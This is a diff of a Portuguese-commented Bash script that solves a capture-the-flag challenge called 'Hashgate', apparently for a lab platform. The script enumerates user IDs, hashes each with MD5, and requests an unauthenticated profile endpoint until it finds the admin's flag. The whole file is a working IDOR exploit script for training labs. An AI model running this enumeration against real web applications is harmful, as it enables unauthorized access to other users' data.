@@ -1,49 +1,28 @@
 #!/bin/bash
+# Hashgate — IDOR via MD5(id) sequencial. O endpoint /profile/user/<md5(id)>
+# não exige autenticação; o guest tem ID 3000. Varro IDs em volta de 3000,
+# calculo MD5 de cada um e procuro o perfil do admin (que traz a flag).
+#
+# Uso: BASE_URL=http://host:porta bash script1.sh
 
-# Alvo da instância atual do desafio
-BASE_URL="http://crystal-peak.picoctf.net:52295"
+BASE_URL="${BASE_URL:-http://xebec.cylabacademy.net:16152}"
 
-# O desafio diz que existem cerca de 20 funcionários.
-# Vamos testar uma faixa um pouco maior para garantir.
-START_ID=2990
-END_ID=3050
-
-echo "[*] Testando IDs de $START_ID até $END_ID"
-echo "[*] Gerando MD5(id) e acessando /profile/user/<hash>"
-echo
+START_ID=2980
+END_ID=3100
 
 for id in $(seq $START_ID $END_ID); do
-    # Gera o MD5 do número sem quebra de linha
-    hash=$(echo -n "$id" | md5sum | awk '{print $1}')
+    hash=$(echo -n "$id" | md5sum | awk '{print $1}')   # -n: sem \n
+    response=$(curl -s "$BASE_URL/profile/user/$hash")
 
-    # Monta a URL provável do perfil
-    url="$BASE_URL/profile/user/$hash"
-
-    # Faz a requisição silenciosa
-    response=$(curl -s -L "$url")
-
-    # Se não retornar "User not found", pode ser um perfil válido
+    # Perfis inexistentes respondem "User not found."
     if ! echo "$response" | grep -qi "User not found"; then
-        echo "=========================================="
-        echo "[+] Possível perfil válido encontrado"
-        echo "[+] ID:   $id"
-        echo "[+] MD5:  $hash"
-        echo "[+] URL:  $url"
-        echo
-
-        # Mostra uma versão limpa do HTML/texto para facilitar análise
-        echo "$response" | sed 's/<[^>]*>/\n/g' | sed '/^[[:space:]]*$/d' | head -n 80
-
-        # Tenta extrair a flag diretamente
-        flag=$(echo "$response" | grep -oE 'picoCTF\{[^}]+\}' | head -n 1)
-
+        echo "[+] ID=$id -> $response"
+        flag=$(echo "$response" | grep -oE 'academy\{[^}]+\}' | head -n 1)
         if [ -n "$flag" ]; then
-            echo
-            echo "[FLAG ENCONTRADA] $flag"
+            echo "[FLAG] $flag"
             exit 0
         fi
     fi
 done
 
-echo
-echo "[!] Finalizado. Se não apareceu a flag, me mande a saída dos perfis válidos."
+echo "[!] Fim. Se não apareceu flag, amplie a faixa START_ID/END_ID."
